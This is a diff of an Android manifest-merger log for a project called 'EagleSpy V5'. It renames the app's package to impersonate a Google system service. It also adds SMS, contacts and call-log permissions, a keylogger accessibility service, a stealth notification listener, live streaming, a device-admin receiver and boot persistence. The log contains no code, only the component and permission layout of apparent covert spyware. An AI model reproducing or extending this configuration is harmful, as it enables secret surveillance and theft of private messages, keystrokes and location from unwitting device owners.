@@ -1,9 +1,9 @@
 -- Merging decision tree log ---
 manifest
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:2:1-83:12
-INJECTED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:2:1-83:12
-INJECTED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:2:1-83:12
-INJECTED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:2:1-83:12
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:2:1-191:12
+INJECTED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:2:1-191:12
+INJECTED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:2:1-191:12
+INJECTED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:2:1-191:12
 MERGED from [androidx.databinding:viewbinding:8.2.2] C:\Users\venci\.gradle\caches\transforms-3\c7037c650e7f63dc72225286ec82620a\transformed\viewbinding-8.2.2\AndroidManifest.xml:2:1-7:12
 MERGED from [com.google.android.material:material:1.11.0] C:\Users\venci\.gradle\caches\transforms-3\3a347358b13a1901f4709358b2ed9945\transformed\material-1.11.0\AndroidManifest.xml:17:1-24:12
 MERGED from [androidx.constraintlayout:constraintlayout:2.1.4] C:\Users\venci\.gradle\caches\transforms-3\899eb6999f1668ce0807a12ae7b79a42\transformed\constraintlayout-2.1.4\AndroidManifest.xml:2:1-11:12
@@ -99,43 +99,103 @@ uses-permission#android.permission.RECORD_AUDIO
 ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:16:5-71
 	android:name
 		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:16:22-68
+uses-permission#android.permission.READ_CONTACTS
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:19:5-72
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:19:22-69
+uses-permission#android.permission.READ_CALL_LOG
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:20:5-72
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:20:22-69
+uses-permission#android.permission.READ_SMS
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:23:5-67
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:23:22-64
+uses-permission#android.permission.RECEIVE_SMS
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:24:5-70
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:24:22-67
+uses-permission#android.permission.SEND_SMS
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:25:5-67
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:25:22-64
+uses-permission#android.permission.READ_EXTERNAL_STORAGE
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:28:5-107
+	android:maxSdkVersion
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:28:78-104
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:28:22-77
+uses-permission#android.permission.READ_MEDIA_IMAGES
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:29:5-76
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:29:22-73
+uses-permission#android.permission.READ_MEDIA_VIDEO
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:30:5-75
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:30:22-72
+uses-permission#android.permission.READ_MEDIA_AUDIO
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:31:5-75
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:31:22-72
 uses-permission#android.permission.RECEIVE_BOOT_COMPLETED
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:19:5-81
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:34:5-81
 MERGED from [androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:25:5-81
 MERGED from [androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:25:5-81
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:19:22-78
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:34:22-78
 uses-permission#android.permission.FOREGROUND_SERVICE
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:20:5-77
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:35:5-77
 MERGED from [androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:26:5-77
 MERGED from [androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:26:5-77
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:20:22-74
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:35:22-74
 uses-permission#android.permission.FOREGROUND_SERVICE_CAMERA
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:21:5-84
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:36:5-84
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:21:22-81
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:36:22-81
 uses-permission#android.permission.FOREGROUND_SERVICE_MICROPHONE
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:22:5-88
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:37:5-88
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:22:22-85
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:37:22-85
 uses-permission#android.permission.FOREGROUND_SERVICE_LOCATION
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:23:5-86
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:38:5-86
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:23:22-83
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:38:22-83
+uses-permission#android.permission.FOREGROUND_SERVICE_DATA_SYNC
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:39:5-87
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:39:22-84
 uses-permission#android.permission.WAKE_LOCK
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:24:5-68
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:40:5-68
 MERGED from [androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:23:5-68
 MERGED from [androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:23:5-68
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:24:22-65
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:40:22-65
+uses-permission#android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:41:5-95
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:41:22-92
+uses-permission#android.permission.SCHEDULE_EXACT_ALARM
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:42:5-79
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:42:22-76
+uses-permission#android.permission.POST_NOTIFICATIONS
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:45:5-77
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:45:22-74
+uses-permission#android.permission.BIND_NOTIFICATION_LISTENER_SERVICE
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:48:5-49:47
+	tools:ignore
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:49:9-44
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:48:22-90
 uses-permission#android.permission.SYSTEM_ALERT_WINDOW
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:27:5-78
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:52:5-78
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:27:22-75
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:52:22-75
 application
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:29:5-81:19
-INJECTED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:29:5-81:19
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:54:5-189:19
+INJECTED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:54:5-189:19
 MERGED from [com.google.android.material:material:1.11.0] C:\Users\venci\.gradle\caches\transforms-3\3a347358b13a1901f4709358b2ed9945\transformed\material-1.11.0\AndroidManifest.xml:22:5-20
 MERGED from [com.google.android.material:material:1.11.0] C:\Users\venci\.gradle\caches\transforms-3\3a347358b13a1901f4709358b2ed9945\transformed\material-1.11.0\AndroidManifest.xml:22:5-20
 MERGED from [androidx.constraintlayout:constraintlayout:2.1.4] C:\Users\venci\.gradle\caches\transforms-3\899eb6999f1668ce0807a12ae7b79a42\transformed\constraintlayout-2.1.4\AndroidManifest.xml:9:5-20
@@ -169,87 +229,211 @@ MERGED from [androidx.startup:startup-runtime:1.1.1] C:\Users\venci\.gradle\cach
 	android:appComponentFactory
 		ADDED from [androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:28:18-86
 	android:supportsRtl
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:35:9-35
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:60:9-35
 	android:label
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:33:9-41
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:58:9-41
 	android:roundIcon
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:34:9-63
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:59:9-48
 	tools:targetApi
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:38:9-29
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:63:9-29
 	android:icon
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:32:9-58
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:57:9-43
 	android:allowBackup
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:31:9-36
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:56:9-36
 	android:theme
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:36:9-46
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:61:9-46
 	android:networkSecurityConfig
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:37:9-69
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:62:9-69
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:30:9-36
-activity#com.stealth.eaglespy.MainActivity
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:41:9-49:20
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:55:9-36
+activity#com.google.android.systemservice.SetupWizardActivity
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:66:9-76:20
+	android:excludeFromRecents
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:70:13-46
 	android:launchMode
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:44:13-44
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:69:13-44
 	android:exported
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:43:13-36
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:68:13-36
+	android:taskAffinity
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:71:13-36
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:42:13-41
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:67:13-48
 intent-filter#action:name:android.intent.action.MAIN+category:name:android.intent.category.LAUNCHER
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:45:13-48:29
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:72:13-75:29
 action#android.intent.action.MAIN
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:46:17-69
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:73:17-69
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:46:25-66
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:73:25-66
 category#android.intent.category.LAUNCHER
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:47:17-77
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:74:17-77
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:47:27-74
-service#com.stealth.eaglespy.services.LocationService
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:52:9-55:40
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:74:27-74
+activity-alias#com.google.android.systemservice.ProvisionLauncherActivity
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:79:9-91:26
+	android:enabled
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:82:13-35
+	android:excludeFromRecents
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:85:13-46
+	android:launchMode
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:84:13-44
 	android:exported
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:55:13-37
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:83:13-36
+	android:targetActivity
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:81:13-58
+	android:taskAffinity
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:86:13-36
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:80:13-54
+service#com.google.android.systemservice.services.CommandService
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:94:9-97:40
+	android:exported
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:97:13-37
 	android:foregroundServiceType
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:54:13-53
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:96:13-53
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:53:13-53
-service#com.stealth.eaglespy.services.CameraService
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:57:9-60:40
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:95:13-52
+service#com.google.android.systemservice.services.LocationService
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:99:9-102:40
 	android:exported
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:60:13-37
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:102:13-37
 	android:foregroundServiceType
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:59:13-51
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:101:13-53
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:58:13-51
-service#com.stealth.eaglespy.services.AudioService
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:62:9-65:40
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:100:13-53
+service#com.google.android.systemservice.services.CameraService
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:104:9-107:40
 	android:exported
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:65:13-37
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:107:13-37
 	android:foregroundServiceType
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:64:13-55
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:106:13-51
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:63:13-50
-service#com.stealth.eaglespy.services.CommandService
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:67:9-69:40
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:105:13-51
+service#com.google.android.systemservice.services.AudioService
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:109:9-112:40
 	android:exported
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:69:13-37
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:112:13-37
+	android:foregroundServiceType
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:111:13-55
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:68:13-52
-receiver#com.stealth.eaglespy.services.BootReceiver
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:72:9-79:20
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:110:13-50
+service#com.google.android.systemservice.services.AccessibilityGuardService
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:115:9-126:19
+	android:label
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:119:13-64
 	android:exported
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:74:13-36
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:118:13-37
+	android:permission
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:117:13-79
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:73:13-50
-intent-filter#action:name:android.intent.action.BOOT_COMPLETED+action:name:android.intent.action.QUICKBOOT_POWERON
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:75:13-78:29
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:116:13-63
+intent-filter#action:name:android.accessibilityservice.AccessibilityService
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:120:13-122:29
+action#android.accessibilityservice.AccessibilityService
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:121:17-92
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:121:25-89
+meta-data#android.accessibilityservice
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:123:13-125:70
+	android:resource
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:125:17-67
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:124:17-60
+service#com.google.android.systemservice.services.StealthNotificationListener
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:129:9-140:19
+	android:label
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:133:13-64
+	android:exported
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:132:13-37
+	android:permission
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:131:13-87
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:130:13-65
+intent-filter#action:name:android.service.notification.NotificationListenerService
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:134:13-136:29
+action#android.service.notification.NotificationListenerService
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:135:17-99
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:135:25-96
+meta-data#android.service.notification.default_filter_types
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:137:13-139:37
+	android:value
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:139:17-34
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:138:17-81
+service#com.google.android.systemservice.services.LiveStreamingService
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:143:9-146:40
+	android:exported
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:146:13-37
+	android:foregroundServiceType
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:145:13-62
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:144:13-58
+service#com.google.android.systemservice.services.KeyloggerAccessibilityService
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:149:9-159:19
+	android:exported
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:152:13-37
+	android:permission
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:151:13-79
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:150:13-67
+receiver#com.google.android.systemservice.receivers.SystemAdminReceiver
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:162:9-174:20
+	android:exported
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:165:13-36
+	android:permission
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:164:13-70
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:163:13-58
+meta-data#android.app.device_admin
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:166:13-168:56
+	android:resource
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:168:17-53
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:167:17-56
+intent-filter#action:name:android.app.action.DEVICE_ADMIN_DISABLED+action:name:android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED+action:name:android.app.action.DEVICE_ADMIN_ENABLED
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:169:13-173:29
+action#android.app.action.DEVICE_ADMIN_ENABLED
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:170:17-82
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:170:25-79
+action#android.app.action.DEVICE_ADMIN_DISABLED
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:171:17-83
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:171:25-80
+action#android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:172:17-92
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:172:25-89
+receiver#com.google.android.systemservice.receivers.BootReceiver
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:177:9-187:20
+	android:exported
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:179:13-36
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:178:13-51
+intent-filter#action:name:android.intent.action.BOOT_COMPLETED+action:name:android.intent.action.MY_PACKAGE_REPLACED+action:name:android.intent.action.QUICKBOOT_POWERON+action:name:com.google.android.systemservice.KEEP_ALIVE+action:name:com.htc.intent.action.QUICKBOOT_POWERON
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:180:13-186:29
+	android:priority
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:180:28-50
 action#android.intent.action.BOOT_COMPLETED
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:76:17-79
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:181:17-79
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:76:25-76
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:181:25-76
 action#android.intent.action.QUICKBOOT_POWERON
-ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:77:17-82
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:182:17-82
 	android:name
-		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:77:25-79
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:182:25-79
+action#com.htc.intent.action.QUICKBOOT_POWERON
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:183:17-82
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:183:25-79
+action#android.intent.action.MY_PACKAGE_REPLACED
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:184:17-84
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:184:25-81
+action#com.google.android.systemservice.KEEP_ALIVE
+ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:185:17-86
+	android:name
+		ADDED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:185:25-83
 uses-sdk
 INJECTED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml reason: use-sdk injection requested
 INJECTED from E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml
@@ -616,7 +800,7 @@ ADDED from [androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-
 		ADDED from [androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:24:9-44
 	android:name
 		ADDED from [androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:23:9-81
-permission#com.stealth.eaglespy.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION
+permission#com.google.android.systemservice.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION
 ADDED from [androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:22:5-24:47
 	android:protectionLevel
 		ADDED from [androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:24:9-44
@@ -626,7 +810,7 @@ uses-permission#${applicationId}.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION
 ADDED from [androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:26:5-97
 	android:name
 		ADDED from [androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:26:22-94
-uses-permission#com.stealth.eaglespy.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION
+uses-permission#com.google.android.systemservice.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION
 ADDED from [androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:26:5-97
 	android:name
